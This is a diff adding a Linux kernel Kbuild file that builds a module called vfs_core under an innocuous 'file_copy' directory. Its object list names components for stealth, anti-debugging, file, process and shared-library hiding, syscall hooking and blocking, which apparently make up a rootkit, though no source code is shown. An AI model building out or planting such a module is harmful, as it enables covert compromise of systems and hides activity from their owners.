@@ -1,0 +1,24 @@
+# drivers/file_copy/Kbuild
+
+ccflags-y += -I$(srctree)/drivers/file_copy/include
+
+obj-m += vfs_core.o
+vfs_core-objs := \
+    src/main.o \
+    src/command.o \
+    src/memory.o \
+    src/memory_safe.o \
+    src/memory_batch.o \
+    src/process.o \
+    src/process_cache.o \
+    src/touch.o \
+    src/hook.o \
+    src/stealth.o \
+    src/auth.o \
+    src/antidbg.o \
+    src/file_hide.o \
+    src/proc_hide.o \
+    src/proc_hide_path.o \
+    src/so_hide.o \
+    src/shadow_hook.o \
+    src/syscall_block.o
